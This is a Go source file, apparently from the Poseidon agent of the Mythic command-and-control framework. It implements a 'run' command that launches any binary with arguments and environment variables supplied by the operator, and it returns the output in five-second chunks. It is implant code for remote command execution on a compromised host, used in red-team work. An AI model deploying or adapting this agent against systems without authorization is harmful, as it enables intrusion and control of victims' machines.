package run

import (
	"bufio"
	"time"

	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type runArgs struct {
	Path        string   `json:"path"`
	Args        []string `json:"args"`
	Environment []string `json:"env"`
}

// Run - Function that executes the run command
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := runArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters. Reason: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	command := exec.Command(args.Path, args.Args...)
	command.Env = os.Environ()
	for _, val := range args.Environment {
		command.Env = append(command.Env, val)
	}
	stdout, err := command.StdoutPipe()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	stderr, err := command.StderrPipe()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	stdoutScanner := bufio.NewScanner(stdout)
	stderrScanner := bufio.NewScanner(stderr)
	outputChannel := make(chan string, 1)
	doneChannel := make(chan bool)
	finishedReadingOutput := make(chan bool)
	doneTimeDelayChannel := make(chan bool)
	sendTimeDelayChannel := make(chan bool)
	go func() {
		bufferedOutput := ""
		doneCount := 0
		for {
			select {
			case <-doneChannel:
				doneCount += 1
				if doneCount == 2 {
					msg = task.NewResponse()
					msg.Completed = true
					if bufferedOutput != "" {
						msg.UserOutput = bufferedOutput
					} else {
						msg.UserOutput = fmt.Sprintf("No Output From Command")
					}
					task.Job.SendResponses <- msg
					doneTimeDelayChannel <- true
					finishedReadingOutput <- true
					return
				}
			case newBufferedOutput := <-outputChannel:
				bufferedOutput += newBufferedOutput
			case <-sendTimeDelayChannel:
				if bufferedOutput != "" {
					msg = task.NewResponse()
					msg.UserOutput = bufferedOutput
					task.Job.SendResponses <- msg
					bufferedOutput = ""
				}
			}
		}
	}()
	go func() {
		for stdoutScanner.Scan() {
			outputChannel <- fmt.Sprintf("%s\n", stdoutScanner.Text())
		}
		doneChannel <- true
	}()
	go func() {
		for stderrScanner.Scan() {
			outputChannel <- fmt.Sprintf("%s\n", stderrScanner.Text())
		}
		doneChannel <- true
	}()
	go func() {
		for {
			select {
			case <-doneTimeDelayChannel:
				return
			case <-time.After(5 * time.Second):
				sendTimeDelayChannel <- true
			}
		}
	}()
	err = command.Start()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	// Need to finish reading stdout/stderr before calling .Wait()
	<-finishedReadingOutput
	err = command.Wait()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	return
}
